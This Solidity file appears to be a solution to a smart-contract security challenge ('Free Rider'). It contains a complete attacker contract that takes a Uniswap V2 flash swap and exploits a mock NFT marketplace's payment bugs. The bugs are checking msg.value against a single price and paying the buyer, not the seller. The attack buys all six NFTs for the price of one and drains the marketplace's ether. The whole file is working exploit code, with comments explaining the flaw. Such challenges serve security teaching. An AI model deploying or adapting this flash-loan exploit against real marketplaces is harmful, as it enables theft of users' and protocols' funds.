// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender, 
        uint256 amount0, 
        uint256 amount1, 
        bytes calldata data
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface Pair {
    function swap(
        uint256 amount0Oout, 
        uint256 amount1Out, 
        address to, 
        bytes calldata data
    ) external;
    function token0() external returns (address);
}

interface Weth {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface Marketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (address);
}

interface Nft {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    Pair public pair;
    Weth public weth;
    Marketplace public marketplace;
    Nft public nft;
    address public buyer;
    address public owner;

    uint256 public constant NFT_PRICE = 15 ether;
    bytes public constant EMPTY_DATA = hex"00";         // See Triggering a Flash Swap: https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];
    
    constructor(
        address _pair,
        address _marketplace,
        address _buyer
    ) {
        require(_pair != address(0), "invalid pair address"); 
        require(_marketplace != address(0), "invalid marketplace address"); 
        require(_buyer != address(0), "invalid buyer address"); 

        pair = Pair(_pair);
        weth = Weth(pair.token0());
        marketplace = Marketplace(_marketplace);
        nft = Nft(marketplace.token());
        buyer = _buyer;
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "caller is not owner");

        // Initiate a flash loan for the price in eth of a single nft
        pair.swap(NFT_PRICE, 0, address(this), EMPTY_DATA);
    }

    function uniswapV2Call(
        address, 
        uint256 amount0, 
        uint256, 
        bytes calldata
    ) external override {
        weth.withdraw(amount0);
     
        /*
        Exploit the marketplace errors which only check that 
        1. msg.value is enough to cover a single nft purchase price and not the sum of all nfts 
        being purchased.
        2. Transfers the price to pay to the new nft owner instead of to the previous nft owner. 
        Together, these errors permit purchasing all the nfts for the price of one nft AND
        transfer the marketplace's eth balance (minus the cost of a single nft) to the attacker.
        */
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        // Transfer ownership of the nfts to the buyer
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // Repay the flash loan
        uint256 repayAmount = amount0 + _getFee(amount0);
        weth.deposit{value: repayAmount}();
        bool success = weth.transfer(address(pair), repayAmount);
        require(success, "weth transfer failed");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function _getFee(uint256 amount) private pure returns (uint256) {
        return ((amount * 3) / uint256(997)) + 1;
    }

}
